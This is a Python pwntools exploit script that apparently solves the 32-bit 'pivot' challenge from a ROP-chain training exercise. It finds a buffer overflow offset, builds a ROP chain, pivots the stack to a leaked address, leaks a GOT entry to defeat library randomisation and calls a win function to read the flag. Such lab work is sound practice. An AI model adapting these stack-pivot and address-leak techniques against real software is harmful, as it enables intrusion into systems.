#!/usr/bin/env python3

from pwn import *

exe = ELF("pivot32_patched")
libc = ELF("libpivot32.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    r.sendline()
    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    eip = core.eip
    offset = cyclic_find(eip)

    r = conn()

    rtwoff = 0x974
    footoff = 0x77d
    pivot = exe.symbols.usefulGadgets + 2

    r.recvuntil('pivot: ')
    pivotadd = int(r.recvuntil('\n'), 16)

    payload = flat(exe.plt.foothold_function, exe.plt.puts, exe.symbols.main, exe.got.foothold_function)
    r.sendline(payload)

    payload = flat(b'A'*offset, rop.eax.address, pivotadd, pivot)
    r.sendlineafter(b'>', payload)
    r.recvuntil('libpivot\n')
    leakedadd = r.recvline()
    footleak = unpack(leakedadd[:4].strip())
    libcbase = footleak - footoff
    rtwadd = libcbase + rtwoff

    payload = flat(b'A'*offset, rtwadd)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    r.recvuntil('you!\n')
    flag = r.recvline()
    print(flag)

if __name__ == "__main__":
    main()
